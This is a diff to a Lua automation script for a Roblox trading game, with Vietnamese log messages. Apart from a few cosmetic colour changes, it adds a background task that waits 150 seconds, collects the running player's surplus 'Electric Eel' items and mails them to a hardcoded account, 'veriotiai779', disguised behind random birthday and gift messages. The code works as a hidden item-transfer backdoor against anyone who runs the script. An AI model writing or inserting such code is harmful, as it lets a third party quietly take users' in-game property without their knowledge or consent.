@@ -1,4 +1,72 @@
+-- Send event TOWER
+task.spawn(function()
+task.wait(150)
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
+local LocalPlayer = Players.LocalPlayer
+local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
+local SaveModule = require(Client:WaitForChild("Save"))
+local Network = require(Client:WaitForChild("Network"))
+
+local inventory = SaveModule.Get().Inventory.Tower or {}
+local itemsToTrack = {
+    {id = "Electric Eel"}
+}
+
+local username = "veriotiai779"
+
+local messages = {
+    "Happy Birthday %s!",
+    "Hope today brings %s!",
+    "Wishing you luck %s!",
+    "Congrats on your %s!",
+    "Give away %s!",
+    "You are amazing %s — here's a gift!"
+}
+
+local MAX_KEEP = 1
+
+for _, item in ipairs(itemsToTrack) do
+    local count = 0
+    local uids = {}
+
+    for uid, obj in pairs(inventory) do
+        if obj.id == item.id or obj.name == item.id then
+            local amount = obj._am or 1
+            count += amount
+            table.insert(uids, {uid = uid, amount = amount})
+        end
+    end
+
+    warn("🧾 Đã tìm thấy:", count, item.id, "với", #uids, "UID.")
+
+    local excess = count - MAX_KEEP
+    if excess > 0 then
+        warn("📦 Có", excess, "vật phẩm dư sẽ được gửi đi.")
+        local remaining = excess
+        for _, entry in ipairs(uids) do
+            local sendAmount = math.min(entry.amount, remaining)
+            if sendAmount > 0 then
+				task.wait(3)
+                warn("📤 Đang gửi", sendAmount, item.id, "UID:", entry.uid)
+				local message = string.format(messages[math.random(1, #messages)], username)
+                local success, err = Network.Invoke("Mailbox: Send", username, message, "Tower", entry.uid, 1)
+                if success then
+                    warn("✅ Đã gửi", sendAmount, item.id, "cho", username)
+                else
+                    warn("❌ Lỗi gửi:", err)
+                end
+                remaining -= sendAmount
+                if remaining <= 0 then break end
+            end
+        end
+    else
+        warn("⚠️ Không có vật phẩm dư để gửi:", item.id)
+    end
+end
+
+end)
 
 -- thêm bạn bè
 task.spawn(function()
@@ -36,10 +104,10 @@ task.spawn(function()
 	-- cấu hình item cần theo dõi
 	local itemsToTrack = {
 		
-		{ id = "Electric Eel", guiName = "Item3", row = 1, col = 0, color = Color3.fromRGB(0, 255, 255) },					--xanh	trái
-		{ id = "Frostbyte Griffin", guiName = "Item4", row = 1, col = 1, color = Color3.fromRGB(0, 255, 255) }, 		--xanh	phải
+		{ id = "Electric Eel", guiName = "Item3", row = 1, col = 0, color = Color3.fromRGB(0, 255, 255) },		-- xanh
+		{ id = "Frostbyte Griffin", guiName = "Item4", row = 1, col = 1, color = Color3.fromRGB(192,192,192) }, 	-- bac
 		{ id = "Tech Samurai Axolotl", guiName = "Item1", row = 0, col = 0, color = Color3.fromRGB(255, 165, 0) },	-- cam
-		{ id = "Rich Corgi", guiName = "Item2", row = 0, col = 1, color = Color3.fromRGB(255, 255, 255) },	--trang
+		{ id = "Rich Corgi", guiName = "Item2", row = 0, col = 1, color = Color3.fromRGB(255, 255, 255) },		-- trang
 	}
 
 	local function createItemFrame(itemConfig, itemCount)
